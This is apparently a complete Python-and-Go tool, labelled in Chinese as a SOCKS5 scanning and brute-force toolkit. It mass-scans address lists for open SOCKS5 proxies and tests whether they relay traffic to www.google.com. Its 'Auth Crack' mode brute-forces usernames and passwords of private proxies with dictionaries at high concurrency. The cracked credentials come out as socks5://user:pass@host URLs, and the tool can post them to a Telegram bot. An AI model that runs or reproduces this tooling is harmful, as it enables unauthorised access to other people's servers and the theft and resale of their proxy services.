import subprocess
import sys
import tempfile
import os
import shutil
import hashlib
import json
import time
from datetime import datetime
import getpass
import threading

# --- 依赖库检查 ---
try:
    from tqdm import tqdm
except ImportError:
    print("错误: 缺少 'tqdm' 库。请运行 'pip install tqdm' 进行安装。")
    sys.exit(1)

try:
    import requests
except ImportError:
    print("错误: 缺少 'requests' 库。请运行 'pip install requests' 进行安装。")
    sys.exit(1)

# ==========================================
# GO 核心代码区 (已修复格式和编译问题)
# ==========================================

# 1. 协议验证器 (Protocol Verifier)
GO_SOURCE_CODE_PROTOCOL_VERIFIER = r'''
package main

import (
	"bufio"
	"flag"
	"fmt"
	"net"
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// 进度心跳
func progressReporter(counter *uint64) {
	for {
		time.Sleep(1 * time.Second)
		c := atomic.LoadUint64(counter)
		if c > 0 {
			atomic.AddUint64(counter, ^uint64(c-1)) // 重置计数
			// 发送累积的进度 (这里简化处理，每秒发送一次信号)
			// 在高并发下，我们只打印一个标记字符让Python端捕获
		}
	}
}

func worker(jobs <-chan string, timeout time.Duration, wg *sync.WaitGroup, counter *uint64) {
	defer wg.Done()
	localCount := 0
	
	for target := range jobs {
		conn, err := net.DialTimeout("tcp", target, timeout)
		if err == nil {
			conn.SetDeadline(time.Now().Add(timeout))
			// 发送 SOCKS5 握手包
			conn.Write([]byte{0x05, 0x01, 0x00})
			resp := make([]byte, 2)
			n, _ := conn.Read(resp)
			conn.Close()
			
			// 检查响应: 版本5, 无需认证
			if n == 2 && resp[0] == 0x05 && resp[1] == 0x00 {
				fmt.Printf("S|%s\n", target)
			}
		}
		
		localCount++
		if localCount >= 20 {
			atomic.AddUint64(counter, 20)
			fmt.Println("P")
			localCount = 0
		}
	}
	if localCount > 0 {
		atomic.AddUint64(counter, uint64(localCount))
		fmt.Println("P")
	}
}

func main() {
	inputFile := flag.String("inputFile", "", "Input File")
	outputFile := flag.String("outputFile", "", "Output File") // 实际上Python处理输出，Go只管打印
	threads := flag.Int("threads", 500, "Threads")
	timeout := flag.Int("timeout", 5, "Timeout")
	flag.Parse()

	file, err := os.Open(*inputFile)
	if err != nil {
		return
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	jobs := make(chan string, *threads*2)
	var wg sync.WaitGroup
	var count uint64

	// 启动 Worker
	for i := 0; i < *threads; i++ {
		wg.Add(1)
		go worker(jobs, time.Duration(*timeout)*time.Second, &wg, &count)
	}

	// 发送任务
	go func() {
		for scanner.Scan() {
			t := strings.TrimSpace(scanner.Text())
			if t != "" {
				jobs <- t
			}
		}
		close(jobs)
	}()

	wg.Wait()
}
'''

# 2. 深度连通性验证器 (Deep Verifier)
GO_SOURCE_CODE_DEEP_VERIFIER = r'''
package main

import (
	"bufio"
	"encoding/binary"
	"flag"
	"fmt"
	"net"
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

func worker(jobs <-chan string, timeout time.Duration, wg *sync.WaitGroup, counter *uint64) {
	defer wg.Done()
	localCount := 0
	
	for target := range jobs {
		conn, err := net.DialTimeout("tcp", target, timeout)
		if err == nil {
			conn.SetDeadline(time.Now().Add(timeout))
			// 1. 握手
			conn.Write([]byte{0x05, 0x01, 0x00})
			resp := make([]byte, 2)
			n, _ := conn.Read(resp)
			
			if n == 2 && resp[0] == 0x05 && resp[1] == 0x00 {
				// 2. 尝试连接 Google DNS (8.8.8.8:53) 或 网站
				// 这里为了通用性，我们尝试连接 www.google.com:80
				destHost := "www.google.com"
				destPort := 80
				
				req := []byte{0x05, 0x01, 0x00, 0x03} // CONNECT, IPv4/Domain
				req = append(req, byte(len(destHost)))
				req = append(req, destHost...)
				
				portBytes := make([]byte, 2)
				binary.BigEndian.PutUint16(portBytes, uint16(destPort))
				req = append(req, portBytes...)
				
				conn.Write(req)
				
				reply := make([]byte, 10)
				n2, _ := conn.Read(reply)
				
				// 检查代理服务器是否报告成功 (0x00)
				if n2 >= 4 && reply[1] == 0x00 {
					fmt.Printf("S|%s\n", target)
				}
			}
			conn.Close()
		}
		
		localCount++
		if localCount >= 10 {
			atomic.AddUint64(counter, 10)
			fmt.Println("P")
			localCount = 0
		}
	}
	if localCount > 0 {
		atomic.AddUint64(counter, uint64(localCount))
		fmt.Println("P")
	}
}

func main() {
	inputFile := flag.String("inputFile", "", "Input")
	outputFile := flag.String("outputFile", "", "Output")
	threads := flag.Int("threads", 200, "Threads")
	timeout := flag.Int("timeout", 10, "Timeout")
	flag.Parse()

	file, err := os.Open(*inputFile)
	if err != nil { return }
	defer file.Close()

	scanner := bufio.NewScanner(file)
	jobs := make(chan string, *threads*2)
	var wg sync.WaitGroup
	var count uint64

	for i := 0; i < *threads; i++ {
		wg.Add(1)
		go worker(jobs, time.Duration(*timeout)*time.Second, &wg, &count)
	}

	go func() {
		for scanner.Scan() {
			t := strings.TrimSpace(scanner.Text())
			if t != "" {
				jobs <- t
			}
		}
		close(jobs)
	}()

	wg.Wait()
}
'''

# 3. 认证扫描器 (Auth Scanner)
GO_SOURCE_CODE_SCANNER = r'''
package main

import (
	"flag"
	"fmt"
	"net"
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

type Job struct {
	Host string
	Port string
	User string
	Pass string
}

func worker(jobs <-chan Job, timeout time.Duration, wg *sync.WaitGroup, counter *uint64) {
	defer wg.Done()
	localCount := 0
	
	for j := range jobs {
		target := net.JoinHostPort(j.Host, j.Port)
		conn, err := net.DialTimeout("tcp", target, timeout)
		
		if err == nil {
			conn.SetDeadline(time.Now().Add(timeout))
			
			// 发送: 支持无认证(0x00) 和 账号密码认证(0x02)
			conn.Write([]byte{0x05, 0x02, 0x00, 0x02})
			
			reply := make([]byte, 2)
			n, _ := conn.Read(reply)
			
			if n > 1 {
				if reply[1] == 0x00 {
					// 发现开放代理 (无需密码)
					// 格式: S|IP|Port||OPEN
					fmt.Printf("S|%s|%s||OPEN\n", j.Host, j.Port)
				} else if reply[1] == 0x02 && j.User != "" {
					// 需要认证，发送账号密码
					authReq := []byte{0x01} // Version 1
					authReq = append(authReq, byte(len(j.User)))
					authReq = append(authReq, j.User...)
					authReq = append(authReq, byte(len(j.Pass)))
					authReq = append(authReq, j.Pass...)
					
					conn.Write(authReq)
					
					authResp := make([]byte, 2)
					n2, _ := conn.Read(authResp)
					
					if n2 > 1 && authResp[0] == 0x01 && authResp[1] == 0x00 {
						// 认证成功
						// 格式: S|IP|Port|User|Pass
						fmt.Printf("S|%s|%s|%s|%s\n", j.Host, j.Port, j.User, j.Pass)
					}
				}
			}
			conn.Close()
		}
		
		localCount++
		if localCount >= 50 {
			atomic.AddUint64(counter, 50)
			fmt.Println("P")
			localCount = 0
		}
	}
	
	if localCount > 0 {
		atomic.AddUint64(counter, uint64(localCount))
		fmt.Println("P")
	}
}

func main() {
	proxyFile := flag.String("proxyFile", "", "Proxy File")
	dictFile := flag.String("dictFile", "", "Dict File")
	threads := flag.Int("threads", 500, "Threads")
	timeout := flag.Int("timeout", 5, "Timeout")
	flag.Parse()

	// 1. 读取代理列表
	pData, err := os.ReadFile(*proxyFile)
	if err != nil { return }
	pLines := strings.Split(string(pData), "\n")
	var proxies []string
	for _, l := range pLines {
		t := strings.TrimSpace(l)
		if t != "" {
			proxies = append(proxies, t)
		}
	}

	// 2. 读取字典列表
	dData, err := os.ReadFile(*dictFile)
	if err != nil { return }
	dLines := strings.Split(string(dData), "\n")

	// 3. 启动 Worker
	jobs := make(chan Job, *threads*2)
	var wg sync.WaitGroup
	var count uint64

	for i := 0; i < *threads; i++ {
		wg.Add(1)
		go worker(jobs, time.Duration(*timeout)*time.Second, &wg, &count)
	}

	// 4. 生成并分发任务
	go func() {
		for _, proxy := range proxies {
			parts := strings.Split(proxy, ":")
			if len(parts) != 2 { continue }
			
			for _, credLine := range dLines {
				cl := strings.TrimSpace(credLine)
				if cl == "" { continue }
				
				// 尝试解析 user:pass
				cParts := strings.SplitN(cl, ":", 2)
				if len(cParts) == 2 {
					jobs <- Job{Host: parts[0], Port: parts[1], User: cParts[0], Pass: cParts[1]}
				}
			}
		}
		close(jobs)
	}()

	wg.Wait()
}
'''

# ==========================================
# Python 逻辑区
# ==========================================

COMPILED_BINARIES = {}
CACHE_DIR = ".socks5_toolkit_cache"
CONFIG_FILE = "config.json"

# --- 配置管理 ---
def load_config():
    if not os.path.exists(CONFIG_FILE):
        return {"bot_token": "", "chat_id": "", "custom_id_key": "VPS", "custom_id_value": ""}
    try:
        with open(CONFIG_FILE, 'r', encoding='utf-8') as f: return json.load(f)
    except: return {"bot_token": "", "chat_id": "", "custom_id_key": "VPS", "custom_id_value": ""}

def save_config(config):
    with open(CONFIG_FILE, 'w', encoding='utf-8') as f: json.dump(config, f, indent=4)

def handle_config_menu(config):
    while True:
        print_header("设置菜单")
        print(f"  [1] Bot Token:         {'*' * 10 if config.get('bot_token') else '未设置'}")
        print(f"  [2] Chat ID:           {config.get('chat_id') or '未设置'}")
        print(f"  [3] 自定义标识名:    {config.get('custom_id_key') or 'VPS'}")
        print(f"  [4] 自定义标识值:    {config.get('custom_id_value') or '未设置'}")
        print("\n  [b] 返回主菜单")
        
        choice = input("\n请选择要修改的项: ").lower()
        if choice == '1': config['bot_token'] = input("Bot Token: ")
        elif choice == '2': config['chat_id'] = input("Chat ID: ")
        elif choice == '3': config['custom_id_key'] = input("标识名: ")
        elif choice == '4': config['custom_id_value'] = input("标识值: ")
        elif choice == 'b': break
        save_config(config)

# --- 辅助工具 ---
def print_header(title):
    print("\n" + "="*50); print(f"--- {title} ---"); print("="*50)

def get_validated_input(prompt, validator, err_msg):
    while True:
        v = input(prompt).strip()
        if validator(v): return v
        print(err_msg)

def get_go_path():
    path = shutil.which("go")
    if path: return path
    for p in ["/usr/local/go/bin/go", "C:\\Go\\bin\\go.exe"]:
        if os.path.exists(p): return p
    return None

def compile_go_binaries():
    go_exec = get_go_path()
    if not go_exec:
        print("错误: 未找到 'go' 命令。请先安装 Go 语言环境 (https://go.dev/dl/)。")
        return False
    
    os.makedirs(CACHE_DIR, exist_ok=True)
    sources = {
        "protocol_verifier": GO_SOURCE_CODE_PROTOCOL_VERIFIER, 
        "deep_verifier": GO_SOURCE_CODE_DEEP_VERIFIER, 
        "scanner": GO_SOURCE_CODE_SCANNER
    }
    
    print("正在检查核心组件...")
    for name, code in sources.items():
        out_path = os.path.join(CACHE_DIR, name + (".exe" if sys.platform=="win32" else ""))
        hash_path = os.path.join(CACHE_DIR, name + ".hash")
        cur_hash = hashlib.sha256(code.encode()).hexdigest()
        
        recompile = True
        if os.path.exists(out_path) and os.path.exists(hash_path):
            with open(hash_path, 'r') as f: 
                if f.read() == cur_hash: recompile = False
        
        if recompile:
            print(f"  - 编译优化 {name}...")
            src_path = os.path.join(CACHE_DIR, name + ".go")
            with open(src_path, "w", encoding="utf-8") as f: f.write(code)
            
            # 调用 Go 编译器
            result = subprocess.run(
                [go_exec, "build", "-ldflags", "-s -w", "-o", out_path, src_path], 
                capture_output=True, text=True
            )
            
            if result.returncode != 0:
                print(f"\n[错误] 编译 {name} 失败！")
                print(f"错误信息:\n{result.stderr}")
                return False
                
            with open(hash_path, 'w') as f: f.write(cur_hash)
        
        COMPILED_BINARIES[name] = out_path
    return True

# --- 核心运行逻辑 (带进度条与结果处理) ---
def run_go_process(bin_name, args, total_tasks, raw_output_file):
    bin_path = COMPILED_BINARIES.get(bin_name)
    if not bin_path: return

    print(f"\n启动高性能引擎 | 任务量: {total_tasks}")
    cmd = [bin_path] + args
    
    try:
        # 打开子进程，实时读取stdout
        process = subprocess.Popen(
            cmd, 
            stdout=subprocess.PIPE, 
            stderr=subprocess.PIPE, 
            text=True, 
            encoding='utf-8', 
            errors='replace', 
            bufsize=1
        )
        
        success_count = 0
        with tqdm(total=total_tasks, unit="chk", dynamic_ncols=True, desc="执行中") as pbar:
            with open(raw_output_file, 'w', encoding='utf-8') as f_out:
                while True:
                    line = process.stdout.readline()
                    if not line and process.poll() is not None: break
                    if not line: continue
                    
                    line = line.strip()
                    if line == "P":
                        # P 代表进度心跳
                        pbar.update(20 if bin_name == "protocol_verifier" else (10 if bin_name == "deep_verifier" else 50))
                    elif line.startswith("S|"):
                        # S 代表成功结果
                        success_count += 1
                        f_out.write(line + "\n")
                        f_out.flush()
                        
                        # 在进度条上方打印简略信息
                        parts = line.split("|")
                        if len(parts) >= 2:
                            display = parts[1]
                            if len(parts) >= 4 and parts[3]: # 有用户名
                                display += f" ({parts[3]})"
                            tqdm.write(f"  [+] 发现: {display}")
        
        print(f"\n任务完成。共发现 {success_count} 个有效目标。")
        
    except Exception as e:
        print(f"\n运行时发生错误: {e}")

# --- 结果合成与格式化 ---
def finalize_results(raw_file, output_dir, file_prefix):
    if not os.path.exists(raw_file): return None
    
    timestamp = datetime.now().strftime("%Y%m%d-%H%M")
    final_filename = f"{file_prefix}_Result_{timestamp}.txt"
    final_path = os.path.join(output_dir, final_filename)
    
    unique_lines = set()
    
    with open(raw_file, 'r', encoding='utf-8') as fin:
        for line in fin:
            if not line.startswith("S|"): continue
            parts = line.strip().split("|")
            # 格式解析
            formatted = ""
            if len(parts) == 2: # S|ip:port (协议验证/深度验证)
                formatted = f"socks5://{parts[1]}"
            elif len(parts) >= 5: # S|ip|port|user|pass|OPEN or S|ip|port|user|pass
                if parts[4] == "OPEN": # 标记为 OPEN
                     formatted = f"socks5://{parts[1]}:{parts[2]}"
                else:
                     formatted = f"socks5://{parts[3]}:{parts[4]}@{parts[1]}:{parts[2]}"
            
            if formatted: unique_lines.add(formatted)
            
    if unique_lines:
        with open(final_path, 'w', encoding='utf-8') as fout:
            fout.write("\n".join(sorted(unique_lines)))
        print(f"\n[OK] 结果已合并并格式化: {final_path}")
        print(f"     共 {len(unique_lines)} 行数据，格式: socks5://user:pass@host:port")
        return final_path
    else:
        print("\n[-] 未产生有效结果，跳过文件生成。")
        return None

# --- 任务处理函数 ---
def execute_verifier(config, output_dir, mode):
    modes = {
        "protocol": {"bin": "protocol_verifier", "name": "协议验证", "desc": "快速筛选响应Socks5握手的端口"},
        "deep": {"bin": "deep_verifier", "name": "连通验证", "desc": "深度验证通过Google的连通性"}
    }
    info = modes[mode]
    print_header(info["name"]); print(info["desc"])
    
    f_path = get_validated_input("输入文件 (IP:Port): ", os.path.exists, "文件不存在")
    threads = get_validated_input("并发数 (默认800): ", lambda x: x=="" or x.isdigit(), "") or "800"
    
    # 计算任务量
    total = sum(1 for l in open(f_path, 'r', errors='ignore') if l.strip())
    if total == 0: return

    raw_out = os.path.join(output_dir, "raw_temp.txt")
    run_go_process(info["bin"], ["-inputFile", f_path, "-threads", threads], total, raw_out)
    
    final = finalize_results(raw_out, output_dir, mode)
    if final: send_telegram(config, final, total)
    if os.path.exists(raw_out): os.remove(raw_out)

def handle_auth_scan(output_dir, config):
    print_header("私有代理爆破")
    print("  [1] 组合爆破 (User.txt + Pass.txt)")
    print("  [2] 同名爆破 (User = Pass)")
    print("  [3] 经典模式 (User:Pass 文件)")
    
    c = input("\n选择模式: ")
    temp_dir = tempfile.mkdtemp()
    dict_path = os.path.join(temp_dir, "dict.txt")
    
    try:
        if c == '1':
            uf = get_validated_input("用户文件: ", os.path.exists, "不存在")
            pf = get_validated_input("密码文件: ", os.path.exists, "不存在")
            u_list = [l.strip() for l in open(uf) if l.strip()]
            p_list = [l.strip() for l in open(pf) if l.strip()]
            with open(dict_path, 'w') as f:
                for u in u_list:
                    for p in p_list: f.write(f"{u}:{p}\n")
        elif c == '2':
            wf = get_validated_input("字典文件: ", os.path.exists, "不存在")
            w_list = [l.strip() for l in open(wf) if l.strip()]
            with open(dict_path, 'w') as f:
                for w in w_list: f.write(f"{w}:{w}\n")
        elif c == '3':
            orig = get_validated_input("字典文件 (user:pass): ", os.path.exists, "不存在")
            shutil.copy(orig, dict_path)
        else: return

        proxy_file = get_validated_input("代理文件 (IP:Port): ", os.path.exists, "不存在")
        threads = get_validated_input("并发数 (默认1000): ", lambda x: x=="" or x.isdigit(), "") or "1000"
        timeout = get_validated_input("超时 (默认5): ", lambda x: x=="" or x.isdigit(), "") or "5"
        
        p_count = sum(1 for l in open(proxy_file, errors='ignore') if l.strip())
        d_count = sum(1 for l in open(dict_path, errors='ignore') if l.strip())
        total_tasks = p_count * d_count
        
        raw_out = os.path.join(temp_dir, "raw_scan.txt")
        run_go_process("scanner", ["-proxyFile", proxy_file, "-dictFile", dict_path, "-threads", threads, "-timeout", timeout], total_tasks, raw_out)
        
        final = finalize_results(raw_out, output_dir, "Auth_Crack")
        if final: send_telegram(config, final, p_count)
        
    finally:
        shutil.rmtree(temp_dir)

def send_telegram(config, file_path, total):
    if not config.get("bot_token") or not config.get("chat_id"): return
    if input("\n发送结果到 Telegram? (y/n): ").lower() != 'y': return
    
    try:
        url = f"https://api.telegram.org/bot{config['bot_token']}/sendDocument"
        cap = f"{config.get('custom_id_key','VPS')}: {config.get('custom_id_value','')}\n总量: {total}"
        with open(file_path, 'rb') as f:
            requests.post(url, files={'document': f}, data={'chat_id': config['chat_id'], 'caption': cap})
        print("发送成功!")
    except Exception as e: print(f"发送失败: {e}")

# --- 主程序入口 ---
def main():
    if not compile_go_binaries(): sys.exit(1)
    config = load_config()
    out_dir = f"Session_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
    os.makedirs(out_dir, exist_ok=True)
    
    print("\n" + "*"*60)
    print(" " * 10 + "SOCKS5 扫描与爆破工具 (Pro Optimized)")
    print(f"--- 结果目录: {out_dir} ---")
    print("*"*60)

    while True:
        print("\n--- 主菜单 ---")
        print("  [1] 验证 Socks5 协议 (快速)")
        print("  [2] 发现可用 Socks5 (深度连通性)")
        print("  [3] 私有代理爆破 (Auth Crack)")
        print("  [4] 设置")
        print("  [q] 退出")
        
        c = input("\n请选择: ").lower()
        if c == '1': execute_verifier(config, out_dir, "protocol")
        elif c == '2': execute_verifier(config, out_dir, "deep")
        elif c == '3': handle_auth_scan(out_dir, config)
        elif c == '4': handle_config_menu(config)
        elif c == 'q': break
        else: print("无效输入")

if __name__ == "__main__":
    main()
